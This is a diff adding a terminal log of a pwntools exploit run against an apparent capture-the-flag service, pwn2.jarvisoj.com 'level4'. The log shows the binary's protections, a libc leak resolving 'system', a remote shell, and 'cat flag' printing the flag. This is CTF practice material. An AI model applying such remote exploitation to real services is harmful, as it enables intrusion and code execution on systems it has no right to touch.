@@ -1,0 +1,36 @@
+root@kali:~/Desktop/Pwn/level4# python level4.py
+[+] Opening connection to pwn2.jarvisoj.com on port 9880: Done
+[*] '/root/Desktop/Pwn/level4/level4'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[+] Loading from '/root/Desktop/Pwn/level4/level4': 0xf7755930
+[+] Resolving 'system' in 'libc.so': 0xf7755930
+[!] No ELF provided.  Leaking is much faster if you have a copy of the ELF being leaked.
+[*] Trying lookup based on Build ID: 49c9c1b47ac2f97420de20e83d79fc0095977db5
+[*] Skipping unavialable libc 49c9c1b47ac2f97420de20e83d79fc0095977db5
+[*] .gnu.hash/.hash, .strtab and .symtab offsets
+[*] Found DT_GNU_HASH at 0xf7727dd8
+[*] Found DT_STRTAB at 0xf7727de0
+[*] Found DT_SYMTAB at 0xf7727de8
+[*] .gnu.hash parms
+[*] hash chain index
+[*] hash chain
+[+] Resolving 'system' in 'libc.so': 0xf7733b28
+[*] Trying lookup based on Build ID: 49c9c1b47ac2f97420de20e83d79fc0095977db5
+[*] .gnu.hash/.hash, .strtab and .symtab offsets
+[*] Found DT_GNU_HASH at 0xf7727dd8
+[*] Found DT_STRTAB at 0xf7727de0
+[*] Found DT_SYMTAB at 0xf7727de8
+[*] .gnu.hash parms
+[*] hash chain index
+[*] hash chain
+[*] Switching to interactive mode
+$ ls
+flag
+level4
+$ cat flag
+CTF{882130cf51d65fb705440b218e94e98e}
+$  
